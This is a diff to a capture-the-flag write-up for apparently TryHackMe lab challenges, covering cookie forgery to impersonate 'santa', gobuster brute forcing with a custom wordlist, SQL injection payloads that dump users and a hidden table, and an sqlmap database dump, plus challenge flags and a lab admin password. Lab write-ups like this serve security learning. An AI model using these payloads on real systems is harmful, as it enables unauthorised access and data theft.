@@ -3,7 +3,7 @@
 * Once we do that, viewing the cookies shows us a hexidecimal value named "auth"
 * We can decode that with `echo <hex_string> | xxd -r -p`
 * We want to log in to "santa", so let's switch our user for that with the following command:
-* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p`
+* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p | tr -d '\n'`
 * Once we replace the value of the previous cookie with the new one in the "Applications->Cookies" section on chrome developer tools, we get authenticated as santa and can turn on all the controls
 * The flag is `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` 
 
@@ -224,3 +224,55 @@ Requests/sec.: 56.20448
 ```	
 * We see that the date `20201125` worked
 * Going to `http://10.10.143.161/api/site-log.php?date=20201125` gives us the flag: `THM{D4t3_AP1}`
+
+
+# Day 5
+* When we go to `http://10.10.0.174:8000/`, we can see the website homepage
+* The challenge tells us not to bruteforce the login page, but let's do it anyway
+* I tried gobuster with the stock wordlist and it didnt' work, so let's make a custom wordlist
+* First, we can get some words with `cewl http://10.10.0.174:8000/ > websiteWords.txt`
+* Now, to generate the wordlist with that, we can use [mentalist](https://github.com/sc0tfree/mentalist)
+	* We can input in our baselist as `/usr/share/wordlists/dirb/common.txt` and set our append or prepend to `websiteWords.txt`. The case can also be chosen
+	* I saved this in `finalWordlist.txt`
+* Then, running `gobuster dir -u http://10.10.0.174:8000/ -w finalWordlist.txt -t 20`, we get the following: 
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.0.174:8000/
+[+] Threads:        20
+[+] Wordlist:       finalWordlist.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/06 05:10:18 Starting gobuster
+===============================================================
+/santapanel (Status: 200)
+===============================================================
+2020/12/06 05:50:54 Finished
+===============================================================
+
+* `/santapanel` works. When we go there, we get a login page
+* Let's try to get past it with a bit of SQLi
+* Inputting `' OR 1=1 ; --` logs us in
+	* `'` ends the string
+	* `OR 1=1` returns true, which allows the query to select everything
+	* `; -- ` ends the query and ignores everything afterward
+* This logs us in!
+* Now we can input the same stuff, and that gets us all of the gifts and children (22 of them), but we can't see the rest of the database
+	* Another way to ouput the full two columns that might seem more intuitive is `' ; --`
+* We can assume that there's also a username and password column, so let's type in `' UNION SELECT username, password FROM users --`
+	* This shows use the username `admin` and the password `EhCNSWzzFP6sc7gB`, but we still can't see the flag
+* We don't know the names of the tables, so let's get that by appending the tablenames with `' UNION SELECT name, sql FROM sqlite_master WHERE type='table' ; --`
+* Now we can see that there are tables called `hidden_table`, `sequels`, and `users`
+* The `hidden_table` table has the column `flag` of type `text`
+	* Let's get those with `' UNION SELECT flag,NULL FROM hidden_table ; --`
+	* Now we can see the flag `thmfox{All_I_Want_for_Christmas_Is_You}`
+
+* Of course, all of this could also be automated with sqlmap
+* Using burpsuite, we could turn on our proxy and intercept a request on the search page
+	* I saved this as `burpFile.txt` by right-clicking on the request in burp and selecting `Save Item`
+* Now, we can run `sqlmap -r burpFile.txt --dbms=sqlite -a` and press enter a few times to chose default settings, which will dump the whole database
+
